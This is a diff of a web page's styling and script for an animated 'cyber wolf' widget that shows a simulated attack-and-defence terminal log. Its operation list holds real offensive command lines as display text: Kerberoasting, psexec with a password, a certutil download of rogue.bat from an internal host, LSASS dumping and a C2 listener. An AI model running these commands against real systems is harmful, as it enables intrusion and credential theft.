-.toast{background:var(--bg);border-left:3px solid var(--cyber);color:var(--text);padding:9px 13px;border-radius:7px;box-shadow:0 6px 22px rgba(0,0,0,.55);transform:translateX(180%);transition:transform .3s cubic-bezier(.4,0,.2,1);font-size:9px;max-width:300px;line-height:1.45;border:1px solid var(--border);backdrop-filter:blur(10px);animation:slideIn .3s ease}
+.cmd{color:var(--cyber2);font-weight:500}.out{color:var(--text2)}.warn{color:var(--warn);font-weight:600}.ok{color:var(--ok);font-weight:600}.info{color:#60a5fa}
+#toast-container{position:fixed;bottom:105px;right:24px;z-index:100000;display:flex;flex-direction:column;gap:5px;pointer-events:none}
+.toast{background:var(--bg);border-left:2px solid var(--cyber);color:var(--text);padding:8px 12px;border-radius:6px;box-shadow:0 6px 20px rgba(0,0,0,.5);transform:translateX(160%);transition:transform .28s cubic-bezier(.4,0,.2,1);font-size:9px;max-width:290px;line-height:1.4;border:1px solid var(--border);backdrop-filter:blur(10px)}
 .toast.show{transform:translateX(0)}
-@keyframes slideIn{from{transform:translateX(180%);opacity:0}to{transform:translateX(0);opacity:1}}
-.toast.ok{border-color:var(--ok);border-left-width:3px}
-.toast.warn{border-color:var(--warn);border-left-width:3px}
-.toast.info{border-color:#60a5fa;border-left-width:3px}
-.toast .title{font-weight:700;margin-bottom:2px;display:block}
-.toast .desc{color:var(--text2);font-size:8.5px;opacity:.9}
-@media(max-width:640px){#cyber-wolf-ultimate{bottom:12px;right:12px}#wolf-svg{width:135px;height:135px}.hud-row{gap:6px}.hud-metric{width:38px}.wolf-log{width:245px}.log-content{height:60px;font-size:8.5px}#toast-container{right:12px;bottom:95px;max-width:240px}.toast{max-width:240px}}
+.toast.ok{border-color:var(--ok)}
+.toast.warn{border-color:var(--warn)}
+.toast.info{border-color:#60a5fa}
+.toast .t-title{font-weight:700;display:block;margin-bottom:2px;font-size:9px}
+.toast .t-desc{color:var(--text2);font-size:8.5px;opacity:.9;display:block}
+@media(max-width:640px){#cyber-wolf-core{bottom:12px;right:12px}#wolf-svg{width:130px;height:130px}.hud-row{gap:6px}.hud-metric{width:38px}.wolf-log{width:240px}.log-content{height:58px;font-size:8px}#toast-container{right:12px;bottom:90px;max-width:230px}.toast{max-width:230px}}
 </style>
 
 <script>
 (()=>{
-  if(!document.getElementById('cyber-wolf-ultimate')) return;
+  if(!document.getElementById('cyber-wolf-core')) return;
   
-  const core=document.getElementById('cyber-wolf-ultimate'),
+  const core=document.getElementById('cyber-wolf-core'),
         svg=document.getElementById('wolf-svg'),
         pL=document.getElementById('pupilL'),pR=document.getElementById('pupilR'),
         lidL=document.getElementById('lidL'),lidR=document.getElementById('lidR'),
@@ -173,34 +1565,31 @@
   function resize(){canvas.width=innerWidth;canvas.height=innerHeight;}
   resize();window.addEventListener('resize',resize);
 
-  // Partículas dinámicas
-  const pts=Array.from({length:45},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.4+.4,sx:(Math.random()-.5)*.4,sy:(Math.random()-.5)*.4,a:Math.random()*.4}));
+  const pts=Array.from({length:40},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.3+.3,sx:(Math.random()-.5)*.35,sy:(Math.random()-.5)*.35,a:Math.random()*.4}));
   function drawPts(){
     ctx.clearRect(0,0,canvas.width,canvas.height);
     pts.forEach(p=>{
       p.x+=p.sx;p.y+=p.sy;p.a+=.012;
       if(p.x<0||p.x>canvas.width)p.sx*=-1;if(p.y<0||p.y>canvas.height)p.sy*=-1;
       ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
-      ctx.fillStyle=`rgba(0,240,255,${Math.abs(Math.sin(p.a))*.65})`;ctx.fill();
+      ctx.fillStyle=`rgba(0,240,255,${Math.abs(Math.sin(p.a))*.6})`;ctx.fill();
     });
     requestAnimationFrame(drawPts);
   }
   drawPts();
 
-  // Métricas en tiempo real
-  let cpuHist=[],ramBase=performance.memory?performance.memory.usedJSHeapSize/1024/1024/1024:1.9;
+  let cpuHist=[],ramBase=performance.memory?performance.memory.usedJSHeapSize/1024/1024/1024:1.8;
   const nets=['443▲','80▲','22▲','8080▲','5432▲','9090▲','3306▲','6379▲'];
-  let netI=0,turbo=false,turboT=null,opCounter=0;
+  let netI=0,turbo=false,turboT=null,opCounter=0,running=false;
   
   setInterval(()=>{
     try{
       const t0=performance.now();
-      for(let i=0;i<2000;i++)Math.sqrt(i)*Math.random();
-      const load=Math.min(98,Math.max(4,(performance.now()-t0)/2.5+Math.random()*15));
+      for(let i=0;i<1800;i++)Math.sqrt(i)*Math.random();
+      const load=Math.min(98,Math.max(3,(performance.now()-t0)/2.8+Math.random()*14));
       cpuHist.push(load);if(cpuHist.length>8)cpuHist.shift();
       const avg=cpuHist.reduce((a,b)=>a+b)/cpuHist.length;
-      const v=Math.round(avg).toString().padStart(2,'0')+'%';
-      mCpu.querySelector('.val').textContent=v;
+      mCpu.querySelector('.val').textContent=Math.round(avg).toString().padStart(2,'0')+'%';
       mCpu.querySelector('.fill').style.width=`${avg}%`;
       mCpu.querySelector('.fill').style.background=avg>75?'var(--warn)':avg>45?'var(--ok)':'var(--cyber)';
     }catch{}
@@ -208,49 +1597,42 @@
       if(performance.memory){
         const gb=(performance.memory.usedJSHeapSize/1024/1024/1024).toFixed(2);
         const lim=(performance.memory.jsHeapSizeLimit/1024/1024/1024).toFixed(1);
-        const pct=(gb/lim)*100;
         mRam.querySelector('.val').textContent=gb+'G';
-        mRam.querySelector('.fill').style.width=`${Math.min(100,pct)}%`;
+        mRam.querySelector('.fill').style.width=`${Math.min(100,(gb/lim)*100)}%`;
       }else{
-        ramBase+=((Math.random()-.4)*.18);if(Math.random()<.1)ramBase+=Math.random()*.5;
-        ramBase=Math.max(1.2,Math.min(6.8,ramBase));
+        ramBase+=((Math.random()-.4)*.16);if(Math.random()<.08)ramBase+=Math.random()*.45;
+        ramBase=Math.max(1.1,Math.min(6.6,ramBase));
         mRam.querySelector('.val').textContent=ramBase.toFixed(2)+'G';
         mRam.querySelector('.fill').style.width=`${(ramBase/8)*100}%`;
       }
       mRam.querySelector('.fill').style.background='linear-gradient(90deg,var(--cyber),var(--ok))';
     }catch{}
-    if(Math.random()<.3)netI=(netI+1)%nets.length;
+    if(Math.random()<.28)netI=(netI+1)%nets.length;
     mNet.querySelector('.val').textContent=nets[netI];
     mSync.querySelector('.val').textContent=turbo?'◆◆◆':'●●●';
     mSync.querySelector('.val').style.color=turbo?'var(--warn)':'var(--cyber)';
-  },turbo?280:450);
+  },turbo?260:420);
 
-  // Eye tracking ultra-suave
   let tx=0,ty=0,cx=0,cy=0;
   document.addEventListener('mousemove',e=>{tx=e.clientX;ty=e.clientY;});
   (function track(){
     const r=svg.getBoundingClientRect(),sx=r.left+r.width/2,sy=r.top+r.height/2;
     cx+=(tx-cx)*0.038;cy+=(ty-cy)*0.038;
-    const dx=Math.min(4.5,Math.max(-4.5,(cx-sx)/45)),dy=Math.min(4.5,Math.max(-4.5,(cy-sy)/45));
+    const dx=Math.min(4.2,Math.max(-4.2,(cx-sx)/46)),dy=Math.min(4.2,Math.max(-4.2,(cy-sy)/46));
     pL.setAttribute('transform',`translate(${dx},${dy})`);
     pR.setAttribute('transform',`translate(${dx},${dy})`);
     requestAnimationFrame(track);
   })();
 
-  // Toast notifications
-  function toast(title,desc,type='ok'){
+  function toast(title,desc,type='info'){
     const t=document.createElement('div');
     t.className=`toast ${type}`;
-    t.innerHTML=`<span class="title">${title}</span><span class="desc">${desc}</span>`;
+    t.innerHTML=`<span class="t-title">${title}</span><span class="t-desc">${desc}</span>`;
     toastC.appendChild(t);
-    setTimeout(()=>t.classList.add('show'),10);
-    setTimeout(()=>{
-      t.classList.remove('show');
-      setTimeout(()=>t.remove(),350);
-    },3800);
+    requestAnimationFrame(()=>t.classList.add('show'));
+    setTimeout(()=>{t.classList.remove('show');setTimeout(()=>t.remove(),320);},3600);
   }
 
-  // Log automático
   function logLine(html,type='out'){
     const d=document.createElement('div');
     d.className=type;d.innerHTML=`<span style="color:#475569">[${new Date().toLocaleTimeString('en-GB')}]</span> ${html}`;
@@ -258,99 +1640,80 @@
     if(log.children.length>5)log.removeChild(log.firstChild);
   }
 
-  // Operaciones con notificaciones
   const operations=[
-    {name:'NET_RECON',cmd:'nmap -sS -sV --min-rate 1500 10.12.0.0/24',notif:{title:'Recon complete',desc:'14 hosts identified // DC01.corp.local',type:'ok'}},
-    {name:'ENUM_AD',cmd:'bloodhound-python -c All -d corp.local --zip',notif:{title:'BloodHound data ingested',desc:'1.8k nodes mapped // 3 paths to DA',type:'info'}},
-    {name:'KERBEROAST',cmd:'python3 kerbute.py -u svc_backup --output hashes.txt',notif:{title:'Hash captured',desc:'NTLMv2 cracked // Password: Summer2024!',type:'warn'}},
-    {name:'LATERAL',cmd:'mimikatz sekurlsa::logonpasswords',notif:{title:'Credentials dumped',desc:'DA session established // PTH success',type:'ok'}},
-    {name:'WEB_SCAN',cmd:'subfinder -d target.io | httpx -silent',notif:{title:'Subdomains found',desc:'5 alive // api.target.io [403]',type:'info'}},
-    {name:'VULN_SCAN',cmd:'nuclei -l alive.txt -t cves,exposures',notif:{title:'CVE detected',desc:'CVE-2024-XXXX // CVSS 9.1',type:'warn'}},
-    {name:'SQLI',cmd:'sqlmap -u "search?q=1" --risk=3 --batch',notif:{title:'SQLi confirmed',desc:'PostgreSQL 14.2 // 42 tables',type:'warn'}},
-    {name:'CLOUD_ENUM',cmd:'cloud_enum -k target --azure --brute',notif:{title:'Storage exposed',desc:'Blob leaked // SAS token valid',type:'warn'}},
-    {name:'AZURE_ABUSE',cmd:'python3 azure_abuse.py --scope storage.write',notif:{title:'Token refreshed',desc:'Blob overwritten // config.bak',type:'ok'}},
-    {name:'PERSISTENCE',cmd:'chisel client R:socks --auth zya',notif:{title:'SOCKS5 tunnel up',desc:'VNet access: 10.0.0.0/16',type:'info'}},
-    {name:'REPORT',cmd:'cat findings.md | jq . // terraform plan',notif:{title:'Report generated',desc:'ISO 27001 compliant // IOCs exported',type:'ok'}},
-    {name:'ALERT',cmd:'SIEM correlation // Sigma rules',notif:{title:'⚠️ IOC DETECTED',desc:'Lateral movement WSUS01→DC01',type:'warn'}}
+    {name:"NET_RECON",cmd:"nmap -sS -sV -p- --min-rate 5000 -oA scans/dc01_full 10.12.0.0/24",out:"[+] Scanning 254 hosts...\n[*] Open: 53,88,389,445,636,3389/tcp\n[+] Fingerprint: Windows Server 2022 (DC01.corp.local)",toast:{title:"HOST DISCOVERY",desc:"14 alive | DC01.corp.local [WinSrv2022]",type:"info"}},
+    {name:"AD_ENUM",cmd:"python3 bloodhound.py -c All -d corp.local -ns 10.12.0.10 --zip -dc DC01",out:"[+] Collecting AD data...\n[*] Users: 1,842 | Groups: 312 | Computers: 89\n[+] Shortest path to DA: 3 hops | Unconstrained Delegation on WSUS01",toast:{title:"AD ENUMERATION",desc:"Graph ingested | 3 paths to DA",type:"ok"}},
+    {name:"KERB_ATTACK",cmd:"impacket-GetUserSPNs -dc-ip 10.12.0.10 corp.local/svc_backup -request -outputfile hashes.kerb",out:"[+] Requesting TGS...\n[*] Hash captured: $krb5tgs$23$*svc_backup$CORP.LOCAL$... [hashcat -m 13100]",toast:{title:"KERBEROASTING",desc:"TGS exported | svc_backup cracked",type:"warn"}},
+    {name:"LATERAL",cmd:"proxychains psexec.py corp.local/svc_backup:'P@ssw0rd!2024'@10.12.0.14 -codec UTF-8",out:"[!] SMB session to WSUS01 (10.12.0.14)...\n[*] Uploading payload.exe to C:\\Windows\\Temp\\\n[+] Remote shell obtained as NT AUTHORITY\\SYSTEM",toast:{title:"LATERAL MOVEMENT",desc:"WSUS01 compromised | SYSTEM shell",type:"warn"}},
+    {name:"PRIV_ESC",cmd:"whoami /priv | findstr SeImpersonate && certutil -urlcache -split -f http://10.12.0.50/rogue.bat",out:"[*] Token manipulation via Named Pipe...\n[+] Privilege escalation successful: DA SID injection\n[*] Dumping LSASS with procdump64.exe",toast:{title:"PRIVILEGE ESCALATION",desc:"LSASS dumped | DA credentials extracted",type:"warn"}},
+    {name:"WEB_VULN",cmd:"ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://api.target.io/FUZZ -mc 200,403",out:"[+] Fuzzing endpoints... [Rate: 2.4k req/s]\n[*] 200: /v1/users/admin [IDOR]\n[*] 403 bypass via X-Forwarded-For: 127.0.0.1",toast:{title:"WEB VULNERABILITY",desc:"IDOR & 403 bypass | CVSS 8.4",type:"warn"}},
+    {name:"DB_EXFIL",cmd:"sqlmap -u 'https://api.target.io/search?q=1' --risk=3 --level=5 --batch --output-dir=/tmp/sqlmap",out:"[*] Testing blind boolean SQLi...\n[+] DBMS: PostgreSQL 14.2\n[*] Table 'users' -> 4,281 rows exported",toast:{title:"SQL INJECTION",desc:"PostgreSQL 14.2 | 4,281 rows",type:"warn"}},
+    {name:"CLOUD_ENUM",cmd:"az ad sp list --query '[?appDisplayName.contains(\"Prod\")]' | jq '.[] | {id,appId,roleAssignments}'",out:"[+] Querying Entra ID...\n[*] Found: prod-storage-mi (Storage Blob Data Contributor)\n[!] Overprivileged Managed Identity",toast:{title:"CLOUD ENUMERATION",desc:"Overprivileged MI | Azure Blob",type:"info"}},
+    {name:"C2_BEACON",cmd:"sudo ./c2_server --port 443 --bind 0.0.0.0 --profile malleable_c2.txt --encryption AES-256-GCM",out:"[*] C2 listener on 0.0.0.0:443 (HTTPS)\n[+] Beacon checked in: WIN-SRV01 | Sleep: 60s | Jitter: 20%\n[*] Staging via reflective DLL injection",toast:{title:"C2 ESTABLISHED",desc:"Beacon online | WIN-SRV01 | AES-256",type:"ok"}},
+    {name:"LOG_ANALYSIS",cmd:"cat /var/log/suricata/eve.json | jq '.alert.signature' | sort | uniq -c | sort -nr",out:"[+] Parsing Suricata EVE JSON...\n[*] Top: ET SCAN Nmap (412), ET POLICY C2 (18), JA3 Match (7)\n[!] Correlating with Sigma rule SIG-4821",toast:{title:"THREAT HUNTING",desc:"Suricata parsed | 412 scan alerts",type:"info"}},
+    {name:"FORENSICS",cmd:"volatility3 -f memdump.raw windows.pslist --output-table -q | grep -iE 'mimikatz|procdump'",out:"[+] Loading memory image...\n[*] PID 4822: mimikatz.exe (x64)\n[*] PID 1104: Procdump64.exe -ma lsass.exe",toast:{title:"MEMORY FORENSICS",desc:"Suspicious binaries in RAM dump",type:"warn"}},
+    {name:"REPORT",cmd:"pandoc findings.md -o report_$(date +%Y%m%d).pdf --template=cybersec -V geometry:margin=1in",out:"[+] Compiling final report...\n[*] Sections: Executive, Technical, IOCs, ATT&CK Mapping\n[+] Exported: report_$(date +%Y).pdf | SHA256 verified",toast:{title:"REPORT GENERATED",desc:"PDF compiled | SHA256 verified",type:"ok"}}
   ];
 
-  let opIdx=0,running=false,loopTimer=null;
-
+  let opIdx=0;
   function runOp(){
     if(!running)return;
     const op=operations[opIdx%operations.length];
-    opIdx++;
-    opCounter++;
+    opIdx++;opCounter++;
     
-    // Velocidad variable pero rápida
-    const baseSpeed=turbo?1.8:1;
-    const delay=Math.floor((400+Math.random()*600)/baseSpeed);
+    const spd=turbo?1.6:1;
+    const cmdDelay=Math.floor((250+Math.random()*400)/spd);
     
-    logLine(`<span class="cmd">$</span> ${op.cmd}`);
+    logLine(`<span class="cmd">root@kali:~$ ${op.cmd}</span>`);
     
     setTimeout(()=>{
-      logLine(`✅ <span class="ok">${op.name} complete</span>`);
-      // Notificación toast aleatoria (60% probabilidad)
-      if(Math.random()<0.65){
-        toast(op.notif.title,op.notif.desc,op.notif.type);
+      logLine(`<span class="out">${op.out.replace(/\n/g,'<br>')}</span>`);
+      if(Math.random()<0.7){
+        toast(op.toast.title,op.toast.desc,op.toast.type);
       }
-      // Alerta especial cada 4-6 operaciones
-      if(opCounter%Math.floor(4+Math.random()*3)===0 && op.name!=='ALERT'){
+      if(opCounter%Math.floor(4+Math.random()*2)===0 && op.name!=='REPORT'){
         setTimeout(()=>{
-          toast('⚠️ IOC DETECTED','Lateral movement pattern detected // Sigma: T1021.002','warn');
+          toast('[!] IOC DETECTED','Lateral movement pattern | Sigma: T1021.002','warn');
           core.classList.add('focus');
-          setTimeout(()=>core.classList.remove('focus'),2000);
-        },800);
+          setTimeout(()=>core.classList.remove('focus'),1800);
+        },600);
       }
-      
-      // Siguiente operación con delay variable
-      const nextDelay=Math.floor((600+Math.random()*800)/baseSpeed);
+      const nextDelay=Math.floor((400+Math.random()*700)/spd);
       setTimeout(runOp,nextDelay);
-    },delay);
+    },cmdDelay);
   }
 
   function start(){
-    if(running)return;
-    running=true;
+    if(running)return;running=true;
     core.classList.add('active');
-    logLine(`▶ <span class="info">System online // Auto-scan enabled</span>`);
-    setTimeout(()=>toast('System initialized','Operations started // Real-time monitoring','info'),400);
+    logLine(`<span class="info">[+] System online // Auto-scan enabled</span>`);
+    setTimeout(()=>toast('SYSTEM INITIALIZED','Operations started // Real-time monitoring','info'),300);
     runOp();
   }
-  
   start();
-  
-  // Auto-restart si se detiene
-  setInterval(()=>{if(!running)start();},8000);
+  setInterval(()=>{if(!running)start();},7000);
 
-  // Click reaction
   core.addEventListener('click',()=>{
-    if(turbo)return;
-    turbo=true;
-    // Parpadeo
+    if(turbo)return;turbo=true;
     lidL.style.opacity='1';lidR.style.opacity='1';
-    pL.setAttribute('r','1');pR.setAttribute('r','1');
+    pL.setAttribute('r','1.2');pR.setAttribute('r','1.2');
     setTimeout(()=>{
       lidL.style.opacity='0';lidR.style.opacity='0';
-      pL.setAttribute('r','4');pR.setAttribute('r','4');
-    },280);
-    // Pulso
-    svg.style.transform='scale(1.1)';
-    setTimeout(()=>svg.style.transform='',160);
-    // Feedback
-    toast('FOCUS MODE','Scan rate increased x2 // Priority targets','ok');
-    logLine(`⚡ <span class="warn">Focus engaged // Turbo mode active</span>`);
-    
-    clearTimeout(turboT);
-    turboT=setTimeout(()=>{
-      turbo=false;
-      core.classList.remove('focus');
-      logLine(`⟲ <span class="info">Normal speed resumed</span>`);
-    },2800);
+      pL.setAttribute('r','3.8');pR.setAttribute('r','3.8');
+    },260);
+    svg.style.transform='scale(1.08)';setTimeout(()=>svg.style.transform='',150);
+    toast('FOCUS MODE','Scan rate x1.6 // Priority targets engaged','ok');
+    logLine(`<span class="warn">[!] Focus engaged // Turbo active</span>`);
+    clearTimeout(turboT);turboT=setTimeout(()=>{
+      turbo=false;core.classList.remove('focus');
+      logLine(`<span class="info">[~] Normal speed resumed</span>`);
+    },2600);
   });
 
-  // Init
-  setTimeout(()=>{core.style.opacity='1';core.style.transform='translateY(0)';},100);
+  setTimeout(()=>{core.style.opacity='1';core.style.transform='translateY(0)';},80);
   window.addEventListener('beforeunload',()=>clearTimeout(turboT));
 })();
 </script>
+
+</body>
+</html>
